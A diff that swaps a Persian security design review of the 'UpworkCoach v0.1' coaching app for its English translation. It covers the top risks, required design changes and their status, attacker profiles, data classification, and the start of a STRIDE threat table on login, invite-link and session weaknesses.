@@ -1,336 +1,336 @@
-# امنیت — UpworkCoach نسخه‌ی 0.1 («دفتر مربی»)
+# Security — UpworkCoach v0.1 ("Coach Office")
 
-> فاز ۳ (بازبینی طراحی پیش از کدنویسی) — ۲۷ مهر ۱۴۰۵ (2026-10-19) — نویسنده: security-reviewer
-> ورودی‌ها: `CLAUDE.md`، `STATUS.md`، `02-product/prd.md` (بخش ۵، ۶، ۸، F1، F2، F5، F11)، `overview.md`، `tech-stack.md`، `data-model.md`، `api.md`، ADR-0002، ADR-0003، ADR-0004، ADR-0007، ADR-0008، `03-ux/sitemap.md`
-> دامنه: فقط طراحی 0.1. **AI، پرداخت و OTP در 0.1 نیستند** و اینجا فقط به آن‌ها اشاره می‌شود (بخش ۹).
-> روش: فقط مطالعه‌ی اسناد. هیچ آزمونی روی محیط واقعی انجام نشده است.
+> Phase 3 (design review before coding) — 27 Mehr 1405 (2026-10-19) — author: security-reviewer
+> Inputs: `CLAUDE.md`, `STATUS.md`, `02-product/prd.md` (sections 5, 6, 8, F1, F2, F5, F11), `overview.md`, `tech-stack.md`, `data-model.md`, `api.md`, ADR-0002, ADR-0003, ADR-0004, ADR-0007, ADR-0008, `03-ux/sitemap.md`
+> Scope: the 0.1 design only. **AI, payments and OTP are not in 0.1** and are only mentioned here (section 9).
+> Method: document review only. No tests were run against a live environment.
 
 ---
 
-## ۰. خلاصه
+## 0. Summary
 
-### طراحی فعلی چه چیزهایی را درست دارد
-طراحی پایه‌ی محکمی دارد: نشست در دیتابیس با ابطال فوری، فقط هش SHA-256 توکن‌ها در دیتابیس، argon2id، کوکی `__Host-` با `HttpOnly`، پاسخ یکسان برای خطای ورود با هش ساختگی، بررسی `Origin`، `404` به‌جای `403` برای منبع خارج از دامنه، DTO جدا برای هنرجو، تست قناری، یک تابع برای خواندن یادداشت در مسیر هنرجو، بازکدگذاری تصویر با sharp، پیوست از سرور خودمان، و نبود هیچ فیلدی برای رمز اکانت پلتفرم‌ها.
+### What the current design gets right
+The design has a solid foundation: database-backed sessions with immediate revocation, only SHA-256 token hashes stored in the database, argon2id, a `__Host-` cookie with `HttpOnly`, an identical response for login failures (using a dummy hash), `Origin` checks, `404` instead of `403` for out-of-scope resources, a separate DTO for students, a canary test, a single function for reading notes on the student path, image re-encoding with sharp, attachments served from our own server, and no field at all for platform account passwords.
 
-### پنج ریسک مهم‌تر
-| # | ریسک | شدت | بخش |
+### The five most important risks
+| # | Risk | Severity | Section |
 |---|---|---|---|
-| R1 | **نشت داده‌ی هویتی که هنرجو را به اکانت آپورکش وصل می‌کند** (نام + موبایل + لینک پروفایل + اسکرین‌شات قرارداد). آپورک کاربران ایرانی را مسدود می‌کند (`risks.md` R4)، پس نشت این داده (از IDOR، خروجی CSV یا پشتیبان) می‌تواند اکانت چند هنرجو را با هم از بین ببرد | بالا | ۲، ۳-۲، ۳-۴، ۷ |
-| R2 | **دسترسی بین نقش‌ها از راه شناسه‌های داخل بدنه‌ی درخواست** (`attachmentIds`، `profileId`، `taskId`، `reviewerId`، …). طراحی دامنه‌ی منبع اصلی را بررسی می‌کند، ولی قاعده‌ای برای شناسه‌های ارجاعی ندارد. یک نمونه‌ی خطرناک: مشاور با `POST /users/:id/invite-link` لینک دعوت **یک مدیرِ هنوز دعوت‌نشده** را بسازد و مدیر شود | بالا | ۳-۲، C3 |
-| R3 | **لو رفتن لینک دعوت یا بازنشانی** (توکن در مسیر URL است، پس در لاگ HTTP میزبان و تاریخچه‌ی مرورگر می‌ماند، و در تلگرام فوروارد می‌شود). هر کس لینک را داشته باشد صاحب حساب می‌شود، و برای لینک بازنشانیِ مدیر یعنی صاحب کل سیستم | بالا | ۳-۱، C1 |
-| R4 | **قفل شدن عمدی حساب مدیر** (۵ تلاش غلط به ازای هر موبایل، از هر IP). موبایل مربی عمومی است. هر کسی می‌تواند مربی را بی‌وقفه بیرون نگه دارد. خواندن IP از `X-Forwarded-For` هم مشخص نیست و اگر اولین مقدار خوانده شود، قفل IP دور زده می‌شود | متوسط | ۳-۱، C2 |
-| R5 | **نبود سیاست نگه‌داری و حذف حساب**، در حالی که PRD «امکان حذف حساب» را الزام می‌کند و صفحه‌ی S10 دکمه‌ی «درخواست حذف حساب» دارد، بدون هیچ API یا فرایندی. داده‌ی واقعی ۸۰ نفر از روز اول وارد می‌شود و در دو پشتیبان (Azure و داخل ایران) هم تکثیر می‌شود | متوسط | ۷، C5 |
+| R1 | **Leak of identity data that links a student to their Upwork account** (name + mobile + profile link + contract screenshot). Upwork blocks Iranian users (`risks.md` R4), so a leak of this data (through an IDOR, a CSV export or a backup) could destroy the accounts of several students at once | High | 2, 3-2, 3-4, 7 |
+| R2 | **Cross-role access through IDs inside the request body** (`attachmentIds`, `profileId`, `taskId`, `reviewerId`, ...). The design checks the scope of the primary resource but has no rule for referenced IDs. One dangerous example: a mentor could use `POST /users/:id/invite-link` to create an invite link for **an admin who has not yet been invited**, and become admin | High | 3-2, C3 |
+| R3 | **Leak of an invite or reset link** (the token is in the URL path, so it stays in the host's HTTP logs and the browser history, and gets forwarded on Telegram). Whoever holds the link owns the account, and for an admin's reset link that means owning the whole system | High | 3-1, C1 |
+| R4 | **Deliberate lockout of the admin account** (5 wrong attempts per mobile number, from any IP). The coach's mobile number is public, so anyone can keep the coach locked out indefinitely. It is also unclear how the IP is read from `X-Forwarded-For`, and if the first value is read, the IP lockout can be bypassed | Medium | 3-1, C2 |
+| R5 | **No retention and account-deletion policy**, although the PRD requires "the ability to delete an account" and screen S10 has a "Request account deletion" button with no API or process behind it. Real data of 80 people enters from day one and is also replicated into two backups (Azure and inside Iran) | Medium | 7, C5 |
 
-### تغییرهای لازم در طراحی پیش از کدنویسی (جزئیات در بخش ۴)
-| کد | تغییر | محل | مانع شروع کدنویسی؟ |
+### Design changes required before coding (details in section 4)
+| Code | Change | Where | Blocks the start of coding? |
 |---|---|---|---|
-| C1 | توکن دعوت و بازنشانی از مسیر URL به fragment و بدنه‌ی POST منتقل شود؛ پذیرش دعوت با وارد کردن موبایل تأیید شود | ADR-0003 بخش ۱–۲ و ۷، `api.md` بخش ۲، `sitemap.md` G2/G3 | بله، برای ماژول `identity` |
-| C2 | قفل ورود بر اساس «موبایل + IP» باشد و قفل سراسری موبایل دستگاه‌های شناخته‌شده را قفل نکند؛ قاعده‌ی خواندن IP از پراکسی مشخص شود؛ عمر نشست کارکنان کوتاه‌تر شود؛ نرمال‌سازی رمز | ADR-0003 بخش ۳–۵، `data-model.md` (`auth_throttle`) | بله، برای ماژول `identity` |
-| C3 | قاعده‌ی «شناسه‌های ارجاعی» و چند قاعده‌ی دسترسی جاافتاده | ADR-0004 بخش ۱–۲، `api.md` بخش ۳، ۶، ۷، ۱۴ | بله، پیش از اولین service |
-| C4 | قاعده‌ی پیوست: وصل کردن فقط پیوستِ `pending` همان آپلودکننده؛ محدودیت پیکسل و سهمیه | `data-model.md` ۲-۵ (`attachments`)، `api.md` بخش ۱۴ | بله، برای ماژول `files` |
-| C5 | ستون `users.erased_at`، فرایند حذف (CLI) و سیاست نگه‌داری؛ رفع ناهماهنگی دکمه‌ی حذف حساب در S10 | `data-model.md` ۲-۱، `overview.md` بخش ۵، `sitemap.md` S10 | نه برای شروع؛ پیش از ورود داده‌ی واقعی |
-| C6 | ورود گروهی در 0.1 فقط CSV (بدون XLSX) | `api.md` بخش ۱۳ | نه؛ پیش از ساخت ورود گروهی |
-| C7 | هم‌خوانی اسناد: `SESSION_SECRET` در ADR-0002 هست ولی در قرارداد env نیست؛ `tech-stack.md` بخش ۴ هنوز `docker compose` را برای محیط محلی می‌گوید | ADR-0002 بخش ۶، `tech-stack.md` بخش ۴ و ۵ | نه |
-| C8 | دیتابیس با «Allow access from any Azure service» باز نشود؛ پشتیبان در حساب ذخیره‌سازی جدا که برنامه نمی‌تواند پاکش کند | ADR-0002 بخش ۶–۷ (مالک: devops-engineer) | نه؛ پیش از استقرار |
+| C1 | Move the invite and reset tokens from the URL path to a fragment and the POST body; confirm invite acceptance by entering the mobile number | ADR-0003 sections 1-2 and 7, `api.md` section 2, `sitemap.md` G2/G3 | Yes, for the `identity` module |
+| C2 | Base the login lockout on "mobile + IP", and make sure the global mobile lockout does not lock out known devices; specify the rule for reading the IP behind the proxy; shorten the staff session lifetime; normalize passwords | ADR-0003 sections 3-5, `data-model.md` (`auth_throttle`) | Yes, for the `identity` module |
+| C3 | A rule for "referenced IDs" and a few missing access rules | ADR-0004 sections 1-2, `api.md` sections 3, 6, 7, 14 | Yes, before the first service |
+| C4 | Attachment rule: only a `pending` attachment from the same uploader may be linked; pixel limit and quota | `data-model.md` 2-5 (`attachments`), `api.md` section 14 | Yes, for the `files` module |
+| C5 | A `users.erased_at` column, a deletion process (CLI) and a retention policy; resolve the inconsistency of the delete-account button in S10 | `data-model.md` 2-1, `overview.md` section 5, `sitemap.md` S10 | No for starting; yes before real data enters |
+| C6 | Bulk import in 0.1 is CSV only (no XLSX) | `api.md` section 13 | No; before building bulk import |
+| C7 | Document consistency: `SESSION_SECRET` is in ADR-0002 but not in the env contract; `tech-stack.md` section 4 still mentions `docker compose` for the local environment | ADR-0002 section 6, `tech-stack.md` sections 4 and 5 | No |
+| C8 | Do not open the database with "Allow access from any Azure service"; keep backups in a separate storage account that the app cannot delete from | ADR-0002 sections 6-7 (owner: devops-engineer) | No; before deployment |
 
-### وضعیت اعمال تغییرها (به‌روزرسانی software-architect، ۲۸ مهر ۱۴۰۵)
-| کد | وضعیت | کجا |
+### Status of the changes (update by software-architect, 28 Mehr 1405 (2026-10-20))
+| Code | Status | Where |
 |---|---|---|
-| C1 | **اعمال شد** | ADR-0003 بخش ۱ (شکل لینک `#t=`، CLI یک‌ساعته)، بخش ۲ (lookup/accept با POST، موبایل کامل، ۵ تلاش، مصرف اتمی) و بخش ۷؛ `api.md` بخش ۲ و ۳؛ `data-model.md` ۲-۱ (`auth_tokens.phone_mismatch_count`، `used_user_agent`)؛ `overview.md` ۴-۱؛ `03-ux/sitemap.md` G2، G3 و نقشه‌ی درختی |
-| C2 | **اعمال شد** | ADR-0003 بخش ۳ (طول ۱۲ برای کارکنان، `normalizePassword` قطعی)، بخش ۴ (`getClientIp` با `TRUSTED_PROXY_HOPS`، قفل سه‌لایه، کوکی دستگاه، CLI بازیابی مدیر)، بخش ۵ (نشست کارکنان ۷/۳۰ روز)؛ `data-model.md` ۲-۱ (`auth_throttle`، `sessions.expires_at`، `password_hash`)؛ `api.md` بخش ۲ |
-| C3 | **اعمال شد** | ADR-0004 بخش ۱-۱ (قاعده‌ی شناسه‌های ارجاعی و `assertRefs`؛ خطای یکسان `422`)، بخش ۲ (`invite-link` فقط `role='student'`، نویسنده/بازبین **و** دامنه، summary فقط با رشته‌ی باز، نشست‌ها)، بخش ۴ (نقش‌های M-سابق، M-assignee، غیرفعال، invited؛ T-REF و T-ESC)؛ `api.md` بخش ۱، ۳، ۴، ۶، ۷، ۸، ۱۰، ۱۲. **تفاوت با پیشنهاد:** همه‌ی شناسه‌های ارجاعی رد‌شده، از جمله `studentIds` کار گروهی، `422` می‌گیرند (نه `404`)؛ `404` فقط برای شناسه‌ی مسیر |
-| C4 | **اعمال شد** | `data-model.md` ۲-۵ (`attachments`: پردازش، سقف پیکسل، چرخش و حذف متادیتا، سهمیه، UPDATE اتمی)؛ `api.md` بخش ۱۴ و ورودی‌های `attachmentIds` در بخش ۶، ۱۰، ۱۲ |
-| C5 | **اعمال شد** | ADR-0010 (تازه)؛ `data-model.md` ۲-۱ (`users.erased_at`، CHECK موبایل) و بخش ۶ (نگه‌داری و نگاشت ناشناس‌سازی)؛ `api.md` بخش ۳؛ `overview.md` بخش ۵؛ ADR-0007 (`auth.cleanup` گسترش‌یافته). **تصمیم S10:** دکمه‌ی «درخواست حذف حساب» در 0.1 برداشته و با متن راهنما جایگزین شود (دلیل در ADR-0010 بند ۶)؛ ویرایش ردیف S10 در `sitemap.md` با ux-designer |
-| C6 | **اعمال شد** (به‌روزرسانی software-architect، ۳۰ مهر ۱۴۰۵؛ هماهنگ با کد، اسپرینت ۳) | کد: `POST /imports/students` فقط CSV UTF-8، ۱ مگابایت، ۵۰۰ ردیف، `dryRun` پیش‌فرض. سند: `api.md` بخش ۱۳ |
-| C7 | **اعمال شد** (به‌روزرسانی software-architect، ۳۰ مهر ۱۴۰۵؛ هماهنگ با کد، اسپرینت ۱) | `tech-stack.md` بخش ۵ و `.env.example` (`DEVICE_COOKIE_SECRET`، `TRUSTED_PROXY_HOPS`، `JOB_TRIGGER_SECRET`)؛ ADR-0002 بخش ۶ (`SESSION_SECRET` حذف شد). اجرای تست‌های امنیتی در CI روی Postgres واقعی با devops-engineer |
+| C1 | **Applied** | ADR-0003 section 1 (`#t=` link format, one-hour CLI), section 2 (lookup/accept via POST, full mobile number, 5 attempts, atomic consumption) and section 7; `api.md` sections 2 and 3; `data-model.md` 2-1 (`auth_tokens.phone_mismatch_count`, `used_user_agent`); `overview.md` 4-1; `03-ux/sitemap.md` G2, G3 and the tree map |
+| C2 | **Applied** | ADR-0003 section 3 (length 12 for staff, deterministic `normalizePassword`), section 4 (`getClientIp` with `TRUSTED_PROXY_HOPS`, three-layer lockout, device cookie, admin recovery CLI), section 5 (staff sessions 7/30 days); `data-model.md` 2-1 (`auth_throttle`, `sessions.expires_at`, `password_hash`); `api.md` section 2 |
+| C3 | **Applied** | ADR-0004 section 1-1 (referenced-ID rule and `assertRefs`; uniform `422` error), section 2 (`invite-link` only for `role='student'`, author/reviewer **and** scope, summary only with an open question, sessions), section 4 (roles: former-M, M-assignee, inactive, invited; T-REF and T-ESC); `api.md` sections 1, 3, 4, 6, 7, 8, 10, 12. **Difference from the proposal:** all rejected referenced IDs, including the bulk-task `studentIds`, get `422` (not `404`); `404` is only for the path ID |
+| C4 | **Applied** | `data-model.md` 2-5 (`attachments`: processing, pixel limit, rotation and metadata stripping, quota, atomic UPDATE); `api.md` section 14 and the `attachmentIds` inputs in sections 6, 10, 12 |
+| C5 | **Applied** | ADR-0010 (new); `data-model.md` 2-1 (`users.erased_at`, mobile CHECK) and section 6 (retention and the anonymization mapping); `api.md` section 3; `overview.md` section 5; ADR-0007 (`auth.cleanup` extended). **S10 decision:** the "Request account deletion" button is removed in 0.1 and replaced with explanatory text (reason in ADR-0010 item 6); the S10 row in `sitemap.md` is to be edited with the ux-designer |
+| C6 | **Applied** (update by software-architect, 30 Mehr 1405 (2026-10-22); aligned with the code, sprint 3) | Code: `POST /imports/students` accepts only UTF-8 CSV, 1 MB, 500 rows, `dryRun` by default. Document: `api.md` section 13 |
+| C7 | **Applied** (update by software-architect, 30 Mehr 1405 (2026-10-22); aligned with the code, sprint 1) | `tech-stack.md` section 5 and `.env.example` (`DEVICE_COOKIE_SECRET`, `TRUSTED_PROXY_HOPS`, `JOB_TRIGGER_SECRET`); ADR-0002 section 6 (`SESSION_SECRET` removed). Running the security tests in CI against a real Postgres is with the devops-engineer |
 
-| C8 | **اعمال نشد — باید پیش از استقرار انجام شود** | ADR-0002 بخش ۶–۷ (مالک: devops-engineer) |
+| C8 | **Not applied — must be done before deployment** | ADR-0002 sections 6-7 (owner: devops-engineer) |
 
-> **انحراف‌های پیاده‌سازی از این سند** (software-architect، ۳۰ مهر ۱۴۰۵): کد در چند جا با متن الزامات این سند فرق دارد. حکم معماری در ADR-0003 بخش ۹ و ADR-0004 بخش ۶ آمده است و تأیید یا رد security-reviewer در `docs/05-delivery/followups.md` (F-07 و موارد «بالا») پیگیری می‌شود. متن الزامات این سند را software-architect تغییر نداده است.
+> **Implementation deviations from this document** (software-architect, 30 Mehr 1405 (2026-10-22)): in several places the code differs from the requirements text of this document. The architectural ruling is in ADR-0003 section 9 and ADR-0004 section 6, and the security-reviewer's approval or rejection is tracked in `docs/05-delivery/followups.md` (F-07 and the "High" items). The software-architect did not change the requirements text of this document.
 >
-> **حکم security-reviewer (F-07، ۲۹ مهر ۱۴۰۵):** همه‌ی انحراف‌ها قابل‌قبول‌اند و دو مورد شرط دارند. جزئیات در `docs/06-quality/security-review-2026-10-21.md`. متن SEC-S1، SEC-C3، SEC-R6 و SEC-U6 در بخش ۵ مطابق کد اصلاح شد. یافته‌های تازه‌ی بازبینی کد: F-17، F-18 و F-19.
+> **security-reviewer ruling (F-07, 29 Mehr 1405 (2026-10-21)):** all deviations are acceptable, and two of them carry conditions. Details in `docs/06-quality/security-review-2026-10-21.md`. The text of SEC-S1, SEC-C3, SEC-R6 and SEC-U6 in section 5 was corrected to match the code. New findings from the code review: F-17, F-18 and F-19.
 
 ---
 
-## ۱. دامنه، فرض‌ها و مهاجم‌ها
+## 1. Scope, assumptions and attackers
 
-**فرض‌ها:** ۱ مدیر (بنیان‌گذار)، ۲ تا ۴ مشاور، ۳۰ تا ۸۰ هنرجو (A1)؛ یک توسعه‌دهنده؛ Next.js App Router + Route Handler + RSC؛ Postgres؛ Azure App Service B1 (۱ هسته، حدود ۱٫۷۵ گیگ حافظه)؛ کاربران بیشتر با گوشی و اینترنت ضعیف، و بسیاری با فیلترشکن یا پشت NAT اپراتور.
+**Assumptions:** 1 admin (the founder), 2 to 4 mentors, 30 to 80 students (A1); one developer; Next.js App Router + Route Handler + RSC; Postgres; Azure App Service B1 (1 core, about 1.75 GB memory); most users on phones with poor internet, and many behind a VPN or an operator NAT.
 
-| کد | مهاجم | چه دارد | چه می‌خواهد |
+| Code | Attacker | What they have | What they want |
 |---|---|---|---|
-| X1 | بیرونی ناشناس | اینترنت، فهرست موبایل‌های لورفته (نشت‌های بزرگ داده‌ی ایرانی)، فهرست رمزهای لورفته | ورود به حساب، به‌خصوص حساب مدیر |
-| X2 | هنرجوی کنجکاو یا بدخواه | نشست معتبر هنرجو، ابزار توسعه‌دهنده‌ی مرورگر | دیدن یادداشت داخلی و وضعیت سلامت خودش، داده‌ی هنرجوهای دیگر، XSS علیه مربی |
-| X3 | مشاور خارج از دامنه یا مشاور سابق | نشست مشاور، شناسه‌هایی که قبلاً دیده | دیدن یا تغییر هنرجوی مشاور دیگر، ارتقا به مدیر |
-| X4 | کسی که به لینک، لاگ یا گوشی دسترسی دارد | لینک فورواردشده در تلگرام، لاگ HTTP، گوشی بازِ مربی | تصاحب حساب |
-| X5 | کسی با دسترسی به زیرساخت یا پشتیبان | کلید ذخیره‌سازی، فایل پشتیبان، لپ‌تاپ توسعه‌دهنده | کل داده |
+| X1 | External, anonymous | The internet, lists of leaked mobile numbers (large Iranian data leaks), lists of leaked passwords | Log in to an account, especially the admin account |
+| X2 | Curious or malicious student | A valid student session, the browser developer tools | See the internal notes and health status about themselves, other students' data, XSS against the coach |
+| X3 | Out-of-scope mentor or former mentor | A mentor session, IDs seen earlier | View or change another mentor's student, escalate to admin |
+| X4 | Someone with access to a link, a log or a phone | A link forwarded on Telegram, the HTTP log, the coach's unlocked phone | Take over an account |
+| X5 | Someone with access to the infrastructure or a backup | The storage key, a backup file, the developer's laptop | All the data |
 
 ---
 
-## ۲. داده‌های حساس و طبقه‌بندی
+## 2. Sensitive data and classification
 
-| رده | معنا |
+| Level | Meaning |
 |---|---|
-| **ح۳ — بسیار حساس** | نشتش آسیب مستقیم و جبران‌ناپذیر می‌زند (تصاحب حساب، مسدود شدن اکانت پلتفرم، افشای زندگی خصوصی) |
-| **ح۲ — حساس** | داده‌ی شخصی یا تجاری که نباید بیرون برود |
-| **ح۱ — داخلی** | پیکربندی و داده‌ی غیرشخصی |
+| **Class 3 — highly sensitive** | A leak causes direct, irreparable harm (account takeover, a platform account being blocked, exposure of private life) |
+| **Class 2 — sensitive** | Personal or business data that must not leave the system |
+| **Class 1 — internal** | Configuration and non-personal data |
 
-| داده | محل | رده | چه کسی می‌بیند | نکته |
+| Data | Location | Level | Who sees it | Note |
 |---|---|---|---|---|
-| هش رمز، هش توکن نشست و دعوت | `users.password_hash`، `sessions`، `auth_tokens` | ح۳ | هیچ‌کس از راه API | هرگز در DTO، RSC props، لاگ یا CSV نیاید |
-| لینک دعوت و بازنشانی (توکن خام) | فقط در پاسخ یک‌باره و پیام تلگرام | ح۳ | مدیر/مشاور سازنده | C1 |
-| **پیوند هویت واقعی با اکانت پلتفرم**: نام + موبایل + `platform_profiles.public_url` + اسکرین‌شات‌ها | `users`، `platform_profiles`، `attachments` | **ح۳** | کارکنان در دامنه، خود هنرجو | به‌خاطر R4 در `risks.md`: نشت فهرست «این ایرانی‌ها این اکانت‌های آپورک را دارند» می‌تواند به مسدود شدن گروهی منجر شود |
-| یادداشت داخلی، پرچم (`financial`، `personal`)، وضعیت سلامت و دلیل‌ها | `notes(internal)`، `student_flags`، `student_health` | ح۳ | کارکنان در دامنه؛ **هرگز هنرجو** | ممکن است وضعیت مالی، خانوادگی یا روحی را ثبت کند |
-| درآمد هنرجو | `milestones.amount`، `students.income_goal_usd`، مدرک قرارداد | ح۲ | کارکنان در دامنه، خود هنرجو | اسکرین‌شات قرارداد ممکن است نام کارفرما را هم نشان دهد |
-| موبایل، آیدی تلگرام | `users.phone`، `students.messenger_handle`، `search_text` | ح۲ | کارکنان در دامنه، خود کاربر | در لاگ ممنوع (SEC-L) |
-| پروپوزال‌ها و متن آگهی‌ها (اطلاعات کارفرماها) | `submissions.*_text` | ح۲ | کارکنان در دامنه، خود هنرجو | با رضایت `ai_use_consent` برای ساخت AI در 1.0 |
-| IP و User-Agent | `sessions`، `audit_log` | ح۲ | خود کاربر (دستگاه‌هایش)، مدیر (ممیزی) | نگه‌داری محدود (بخش ۷) |
-| فایل خروجی CSV | لپ‌تاپ مدیر | ح۳ | مدیر | بیرون از کنترل ما؛ ستون حداقلی (SEC-V) |
-| پشتیبان `pg_dump` | Azure + مقصد داخل ایران | ح۳ | فقط صاحب کلید `age` | کلید خصوصی بیرون از Azure (SEC-K) |
-| تنظیمات، مراحل، پلتفرم‌ها | `settings`، `stages`، … | ح۱ | — | — |
+| Password hash, session and invite token hashes | `users.password_hash`, `sessions`, `auth_tokens` | Class 3 | No one through the API | Must never appear in a DTO, RSC props, logs or CSV |
+| Invite and reset links (raw token) | Only in a one-time response and a Telegram message | Class 3 | The creating admin/mentor | C1 |
+| **Link between a real identity and a platform account**: name + mobile + `platform_profiles.public_url` + screenshots | `users`, `platform_profiles`, `attachments` | **Class 3** | Staff in scope, the student themselves | Because of R4 in `risks.md`: a leaked list of "these Iranians have these Upwork accounts" could lead to mass blocking |
+| Internal notes, flags (`financial`, `personal`), health status and reasons | `notes(internal)`, `student_flags`, `student_health` | Class 3 | Staff in scope; **never the student** | May record financial, family or mental state |
+| Student income | `milestones.amount`, `students.income_goal_usd`, contract evidence | Class 2 | Staff in scope, the student themselves | A contract screenshot may also show the client's name |
+| Mobile number, Telegram ID | `users.phone`, `students.messenger_handle`, `search_text` | Class 2 | Staff in scope, the user themselves | Forbidden in logs (SEC-L) |
+| Proposals and job post text (clients' information) | `submissions.*_text` | Class 2 | Staff in scope, the student themselves | With `ai_use_consent` consent for the AI build in 1.0 |
+| IP and User-Agent | `sessions`, `audit_log` | Class 2 | The user themselves (their devices), the admin (audit) | Limited retention (section 7) |
+| CSV export file | The admin's laptop | Class 3 | Admin | Outside our control; minimal columns (SEC-V) |
+| `pg_dump` backup | Azure + the destination inside Iran | Class 3 | Only the holder of the `age` key | The private key is kept outside Azure (SEC-K) |
+| Settings, stages, platforms | `settings`, `stages`, ... | Class 1 | — | — |
 
 ---
 
-## ۳. مدل تهدید (STRIDE)
+## 3. Threat model (STRIDE)
 
-حروف STRIDE: **S** جعل هویت، **T** دستکاری، **R** انکار، **I** افشای اطلاعات، **D** اختلال در سرویس، **E** ارتقای دسترسی.
-شدت: **بحرانی** (تصاحب کل سیستم بدون پیش‌شرط)، **بالا**، **متوسط**، **پایین**. شدت با کنترل‌های فعلی طراحی سنجیده شده، نه پس از رفع شکاف. ستون «اقدام» به شناسه‌های چک‌لیست بخش ۵ اشاره می‌کند.
+STRIDE letters: **S** spoofing, **T** tampering, **R** repudiation, **I** information disclosure, **D** denial of service, **E** elevation of privilege.
+Severity: **Critical** (takeover of the whole system with no preconditions), **High**, **Medium**, **Low**. Severity is judged against the design's current controls, not after the gap is fixed. The "Action" column points to the checklist IDs in section 5.
 
-### ۳-۱. دعوت، ورود با موبایل و رمز، نشست
+### 3-1. Invite, mobile + password login, sessions
 
-| # | STRIDE | تهدید و سناریو | شدت | کنترل فعلی طراحی | شکاف | اقدام |
+| # | STRIDE | Threat and scenario | Severity | Current design control | Gap | Action |
 |---|---|---|---|---|---|---|
-| A1 | S | **حدس رمز (brute force)** روی یک موبایل مشخص، مثلاً موبایل مربی | متوسط | ۵ شکست در ۱۵ دقیقه به ازای موبایل ← قفل؛ ۳۰ به ازای IP؛ argon2id | قفل با چند IP دور زده نمی‌شود (خوب است)، ولی همین قفل ابزار R4 است (A3). برای کارکنان حداقل طول رمز همان ۸ است | C2، SEC-P2، SEC-R1..R6 |
-| A2 | S | **credential stuffing**: مهاجم جفت «موبایل + رمز» را از نشت‌های داده‌ی ایرانی امتحان می‌کند. چون هر کاربر یک بار امتحان می‌شود، قفل به ازای موبایل اثری ندارد | متوسط | قفل IP؛ فهرست ۱۰ هزار رمز رایج | قفل IP با فیلترشکن و IPهای زیاد دور زده می‌شود. فهرست ۱۰ هزار رمز برای رمزهای لورفته کم است. هیچ هشداری روی «شکست زیاد در کل سیستم» نیست | SEC-P3، SEC-R5، SEC-L6 |
-| A3 | D | **قفل عمدی حساب**: مهاجم هر ۱۵ دقیقه ۵ رمز غلط برای موبایل مربی می‌زند. مربی نمی‌تواند وارد شود و راه بازیابی هم فقط از خود مدیر می‌گذرد | متوسط | — | قفل به ازای موبایل بدون توجه به دستگاه. هیچ راه بازیابی مستقل برای تنها مدیر نیست | C2، SEC-R2، SEC-R3، SEC-T7 |
-| A4 | S/I | **جعل IP**: اگر کد اولین مقدار `X-Forwarded-For` را بخواند، مهاجم با فرستادن مقدار دلخواه قفل IP را دور می‌زند و IP جعلی در `sessions` و `audit_log` ثبت می‌شود | متوسط | — | قاعده‌ی خواندن IP پشت پراکسی App Service تعریف نشده | C2، SEC-R4 |
-| A5 | I | **شمارش کاربران** با تفاوت پاسخ یا زمان پاسخ ورود | پایین | پاسخ یکسان، هش ساختگی | اگر قفل فقط برای موبایل‌های موجود شمرده شود، `429` وجود موبایل را لو می‌دهد | SEC-R6 |
-| A6 | S | **لینک دعوت یا بازنشانی لورفته**: توکن در مسیر `/invite/<token>` است. پس (۱) در لاگ HTTP میزبان و لاگ درخواست pino، (۲) در تاریخچه و همگام‌سازی مرورگر، (۳) در گروه یا پیام فورواردشده‌ی تلگرام، و (۴) در سرآیند `Referer` اگر صفحه لینک بیرونی داشته باشد، می‌ماند. هر کس آن را پیش از صاحبش باز کند رمز می‌گذارد و حساب را می‌گیرد. اگر هدف حساب مدیر یا مشاور باشد، شدت بالاتر است | بالا | ۲۵۶ بیت، یک‌بارمصرف، ۷ روز / ۲۴ ساعت، ابطال با ساخت دوباره، نمایش نام | توکن در URL؛ هیچ عامل دومی برای پذیرش نیست؛ لینک دعوت اولین مدیر ۷ روز عمر دارد | C1، SEC-T1..T7 |
-| A7 | S | **پذیرش با لینک فورواردشده بدون اطلاع صاحب حساب**. صاحب واقعی فقط `410` می‌بیند و ممکن است گزارش ندهد | متوسط | — | در UI کارکنان «پذیرفته‌شده در … از دستگاه …» دیده نمی‌شود | SEC-T5 |
-| A8 | S | **تثبیت نشست (session fixation)** | پایین | نشست تازه با ورود و پذیرش؛ پیشوند `__Host-` جلوی تزریق کوکی از زیردامنه را می‌گیرد | چرخش نشست جاری پس از تغییر رمز تصریح نشده | SEC-S4 |
-| A9 | S/E | **سرقت نشست کارکنان** (گوشی باز مربی، دستگاه مشترک). نشست مدیر ۳۰ روز لغزنده و ۹۰ روز مطلق است و ورود دومرحله‌ای نداریم | متوسط | ابطال از «دستگاه‌های من»؛ `HttpOnly` | عمر نشست کارکنان با هنرجو یکی است. پرخطرترین عمل (خروجی CSV همه‌ی هنرجوها) تأیید دوباره نمی‌خواهد | C2، SEC-S2، SEC-S7 |
-| A10 | D | **از کار انداختن سرور با argon2**: هر هش حدود ۱۹ مگابایت حافظه می‌گیرد. ۸۰ درخواست ورود هم‌زمان (حتی با موبایل‌های ناموجود، چون هش ساختگی هم محاسبه می‌شود) حدود ۱٫۵ گیگ حافظه می‌خواهد و B1 را از کار می‌اندازد | متوسط | — | محدودیت هم‌زمانی هش | SEC-P5 |
-| A11 | I | **نشت هش رمز به مرورگر**: یک RSC کل ردیف `users` را به یک کامپوننت کلاینت پاس می‌دهد و `password_hash` در payload صفحه سریال می‌شود | متوسط | DTOها | قاعده‌ای برای «انتخاب صریح ستون‌ها» در repo نیست؛ تست قناری به‌دنبال هش نمی‌گردد | SEC-A9، T-CANARY |
-| A12 | R | کاربر انکار می‌کند که لینک بازنشانی یا تغییر نقش را دیده یا انجام داده | پایین | `audit_log` برای کارهای حساس | ساخت دوباره‌ی لینک دعوت (توسط مشاور هم)، تغییر `visibility` یادداشت، قفل حساب و حذف حساب ثبت نمی‌شوند | SEC-L7 |
+| A1 | S | **Password guessing (brute force)** against a specific mobile number, for example the coach's | Medium | 5 failures in 15 minutes per mobile number → lockout; 30 per IP; argon2id | A lockout cannot be bypassed with multiple IPs (good), but this same lockout is the tool for R4 (A3). For staff, the minimum password length is still 8 | C2, SEC-P2, SEC-R1..R6 |
+| A2 | S | **Credential stuffing**: the attacker tries "mobile + password" pairs from Iranian data leaks. Since each user is tried only once, the per-mobile lockout has no effect | Medium | IP lockout; a list of 10,000 common passwords | The IP lockout is bypassed with a VPN and many IPs. A list of 10,000 passwords is too small for leaked passwords. There is no alert for "many failures across the whole system" | SEC-P3, SEC-R5, SEC-L6 |
